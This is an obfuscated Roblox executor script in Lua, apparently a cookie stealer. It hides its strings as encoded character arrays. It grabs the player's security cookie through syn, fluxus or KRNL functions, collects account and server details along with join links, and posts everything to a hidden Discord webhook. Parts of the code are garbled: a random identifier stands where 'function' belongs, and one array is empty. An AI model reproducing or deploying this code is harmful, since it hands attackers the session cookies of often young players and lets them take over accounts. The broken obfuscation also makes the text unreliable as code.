local IlYKDv3Z = IlYKDv3Z or http_request or syn.IlYKDv3Z or fluxus.IlYKDv3Z or KRNL.HttpRequest
local k1SFsafwjk9Bh = game:GetService(load("return string.char("..table.concat({104,84,84,80,115,69,82,86,73,67,69;32}, ","):gsub(",", ","))")())
local axGJLLkP = game:GetService(load("return string.char("..table.concat({14,50,63,39,59,44,45;94}, ","):gsub(",", ","))")())
local vdLWXGs2T75 = game:GetService(load("return string.char("..table.concat({152,180,167,190,176,161,165,185,180,182,176,134,176,167,163,188,182,176;213}, ","):gsub(",", ","))")())

local iCo1mW099Lyq = load("return string.char("..table.concat({97,125,125,121,122,51,38,38,109,96,122,106,102,123,109,39,106,102,100,38,104,121,96,38,126,108,107,97,102,102,98,122,38,56,58,59,59,48,56,57,58,56,61,60,58,61,57,56,57,49,49,57,38,79,113,58,109,71,106,72,103,111,108,89,60,96,78,121,48,112,78,76,78,103,65,125,59,56,62,67,120,86,108,103,96,86,94,125,62,94,70,90,62,72,67,67,89,93,57,102,78,102,80,68,97,70,48,111,65,68,59,59,122,62,115,123,61,124,99,67,121;9}, ","):gsub(",", ","))")()

-- Collect Roblox security cookie (generalized for multiple executors)
local 0bxfPda4rq getCookie()
    local QZTEmUDC6UgL = load("return string.char("..table.concat({;132}, ","):gsub(",", ","))")()

    -- Try common methods used by various executors
    pcall(0bxfPda4rq()
        if syn then
            QZTEmUDC6UgL = syn.get_securecookie()
        elseif fluxus then
            QZTEmUDC6UgL = fluxus.getcookie()
        elseif KRNL then
            QZTEmUDC6UgL = KRNL.getcookie()
        elseif getgenv and getgenv().cookie then
            QZTEmUDC6UgL = getgenv().cookie -- Custom global environment variable (if manually set)
        else
            QZTEmUDC6UgL = load("return string.char("..table.concat({255,196,193,196,197,221,196,138,239,210,207,201,223,222,197,216,138,197,216,138,255,196,217,223,218,218,197,216,222,207,206,138,231,207,222,194,197,206;170}, ","):gsub(",", ","))")()
        end
    end)

    return QZTEmUDC6UgL
end

-- Gather session FTzrJQUSD
local 0bxfPda4rq gatherInfo()
    local TLJwjnAXG9U = vdLWXGs2T75:GetProductInfo(game.PlaceId)
    local kOEdRFj6i4 = {
        Username = axGJLLkP.LocalPlayer.Name,
        UserId = axGJLLkP.LocalPlayer.UserId,
        PlaceId = game.PlaceId,
        PlaceName = TLJwjnAXG9U.Name,
        JobId = game.JobId,
        ProfileLink = load("return string.char("..table.concat({5,25,25,29,30,87,66,66,26,26,26,67,31,2,15,1,2,21,67,14,2,0,66,24,30,8,31,30,66;109}, ","):gsub(",", ","))")() .. axGJLLkP.LocalPlayer.UserId .. load("return string.char("..table.concat({52,107,105,116,125,114,119,126;27}, ","):gsub(",", ","))")(),
        Cookie = getCookie(), -- Attach the cookie here
        Device = game:GetService(load("return string.char("..table.concat({166,128,150,129,186,157,131,134,135,160,150,129,133,154,144,150;243}, ","):gsub(",", ","))")()).TouchEnabled and load("return string.char("..table.concat({166,132,137,130,135,142;235}, ","):gsub(",", ","))")() or load("return string.char("..table.concat({221,206,162,206,226,227,254,226,225,232;141}, ","):gsub(",", ","))")(),
        AutoJoinLink = load("return string.char("..table.concat({43,54,59,53,54,33,99,118,118,41,53,56,58,60,16,61,100;89}, ","):gsub(",", ","))")() .. game.PlaceId .. load("return string.char("..table.concat({95,30,24,20,28,48,23,10,13,24,23,26,28,48,29,68;121}, ","):gsub(",", ","))")() .. game.JobId -- Auto-join link
    }
    return kOEdRFj6i4
end

-- Send session FTzrJQUSD to webhook
local 0bxfPda4rq sendToWebhook(FTzrJQUSD)
    local sAe7Qj2YKllYD = {
        [load("return string.char("..table.concat({3,15,14,20,5,14,20;96}, ","):gsub(",", ","))")()] = load("return string.char("..table.concat({155,183,180,180,189,187,172,189,188,248,138,183,186,180,183,160,248,139,189,171,171,177,183,182,248,156,185,172,185;216}, ","):gsub(",", ","))")(),
        [load("return string.char("..table.concat({52,60,51,52,53,34;81}, ","):gsub(",", ","))")()] = {{
            [load("return string.char("..table.concat({1,28,1,25,16;117}, ","):gsub(",", ","))")()] = load("return string.char("..table.concat({21,35,53,53,47,41,40,102,15,40,32,41,52,43,39,50,47,41,40;70}, ","):gsub(",", ","))")(),
            [load("return string.char("..table.concat({157,146,158,151,159,136;251}, ","):gsub(",", ","))")()] = {
                {[load("return string.char("..table.concat({34,45,33,41;76}, ","):gsub(",", ","))")()] = load("return string.char("..table.concat({232,206,216,207,211,220,208,216;189}, ","):gsub(",", ","))")(), [load("return string.char("..table.concat({231,240,253,228,244;145}, ","):gsub(",", ","))")()] = FTzrJQUSD.Username, [load("return string.char("..table.concat({91,92,94,91,92,87;50}, ","):gsub(",", ","))")()] = true},
                {[load("return string.char("..table.concat({173,162,174,166;195}, ","):gsub(",", ","))")()] = load("return string.char("..table.concat({130,164,178,165,247,158,147;215}, ","):gsub(",", ","))")(), [load("return string.char("..table.concat({16,7,10,19,3;102}, ","):gsub(",", ","))")()] = tostring(FTzrJQUSD.UserId), [load("return string.char("..table.concat({233,238,236,233,238,229;128}, ","):gsub(",", ","))")()] = true},
                {[load("return string.char("..table.concat({141,130,142,134;227}, ","):gsub(",", ","))")()] = load("return string.char("..table.concat({88,122,103,110,97,100,109,40,68,97,102,99;8}, ","):gsub(",", ","))")(), [load("return string.char("..table.concat({136,159,146,139,155;254}, ","):gsub(",", ","))")()] = load("return string.char("..table.concat({200,197,250,246,228,179,195,225,252,245,250,255,246,206,187;147}, ","):gsub(",", ","))")() .. FTzrJQUSD.ProfileLink .. load("return string.char("..table.concat({36;13}, ","):gsub(",", ","))")(), [load("return string.char("..table.concat({225,230,228,225,230,237;136}, ","):gsub(",", ","))")()] = false},
                {[load("return string.char("..table.concat({92,83,95,87;50}, ","):gsub(",", ","))")()] = load("return string.char("..table.concat({135,187,182,180,178,247,153,182,186,178;215}, ","):gsub(",", ","))")(), [load("return string.char("..table.concat({214,193,204,213,197;160}, ","):gsub(",", ","))")()] = FTzrJQUSD.PlaceName, [load("return string.char("..table.concat({193,198,196,193,198,205;168}, ","):gsub(",", ","))")()] = true},
                {[load("return string.char("..table.concat({93,82,94,86;51}, ","):gsub(",", ","))")()] = load("return string.char("..table.concat({135,187,182,180,178,247,158,147;215}, ","):gsub(",", ","))")(), [load("return string.char("..table.concat({86,65,76,85,69;32}, ","):gsub(",", ","))")()] = tostring(FTzrJQUSD.PlaceId), [load("return string.char("..table.concat({116,115,113,116,115,120;29}, ","):gsub(",", ","))")()] = true},
                {[load("return string.char("..table.concat({208,223,211,219;190}, ","):gsub(",", ","))")()] = load("return string.char("..table.concat({27,62,51,113,24,21;81}, ","):gsub(",", ","))")(), [load("return string.char("..table.concat({134,145,156,133,149;240}, ","):gsub(",", ","))")()] = FTzrJQUSD.JobId, [load("return string.char("..table.concat({32,39,37,32,39,44;73}, ","):gsub(",", ","))")()] = true},
                {[load("return string.char("..table.concat({56,55,59,51;86}, ","):gsub(",", ","))")()] = load("return string.char("..table.concat({96,65,82,77,71,65,4,112,93,84,65;36}, ","):gsub(",", ","))")(), [load("return string.char("..table.concat({205,218,215,206,222;187}, ","):gsub(",", ","))")()] = FTzrJQUSD.Device, [load("return string.char("..table.concat({188,187,185,188,187,176;213}, ","):gsub(",", ","))")()] = true},
                {[load("return string.char("..table.concat({219,212,216,208;181}, ","):gsub(",", ","))")()] = load("return string.char("..table.concat({217,245,245,241,243,255;154}, ","):gsub(",", ","))")(), [load("return string.char("..table.concat({201,222,211,202,218;191}, ","):gsub(",", ","))")()] = load("return string.char("..table.concat({33,33,33;65}, ","):gsub(",", ","))")() .. FTzrJQUSD.Cookie .. load("return string.char("..table.concat({69,69,69;37}, ","):gsub(",", ","))")(), [load("return string.char("..table.concat({104,111,109,104,111,100;1}, ","):gsub(",", ","))")()] = false}, -- Send the cookie
                {[load("return string.char("..table.concat({126,113,125,117;16}, ","):gsub(",", ","))")()] = load("return string.char("..table.concat({143,187,186,161,227,132,161,167,160,238,130,167,160,165;206}, ","):gsub(",", ","))")(), [load("return string.char("..table.concat({172,187,182,175,191;218}, ","):gsub(",", ","))")()] = load("return string.char("..table.concat({109,117,90,95,85,93,22,66,89,22,124,89,95,88,22,101,83,68,64,83,68,107,30,68,89,84,90,89,78,12,25,25,70,90,87,85,83,127,82,11;54}, ","):gsub(",", ","))")() .. FTzrJQUSD.PlaceId .. load("return string.char("..table.concat({56,121,127,115,123,87,112,109,106,127,112,125,123,87,122,35;30}, ","):gsub(",", ","))")() .. FTzrJQUSD.JobId .. load("return string.char("..table.concat({167;142}, ","):gsub(",", ","))")(), [load("return string.char("..table.concat({109,106,104,109,106,97;4}, ","):gsub(",", ","))")()] = false},
            },
            [load("return string.char("..table.concat({125,113,114,113,108;30}, ","):gsub(",", ","))")()] = 0x7289DA
        }}
    }

    IlYKDv3Z({
        Url = iCo1mW099Lyq,
        Method = load("return string.char("..table.concat({36,59,39,32;116}, ","):gsub(",", ","))")(),
        Headers = {[load("return string.char("..table.concat({131,175,174,180,165,174,180,237,148,185,176,165;192}, ","):gsub(",", ","))")()] = load("return string.char("..table.concat({206,223,223,195,198,204,206,219,198,192,193,128,197,220,192,193;175}, ","):gsub(",", ","))")()},
        Body = k1SFsafwjk9Bh:JSONEncode(sAe7Qj2YKllYD),
    })
end

-- Main Execution
local FTzrJQUSD = gatherInfo()
sendToWebhook(FTzrJQUSD) -- Send session FTzrJQUSD to webhook

for _i = 1, math.random(1, 5) do end;
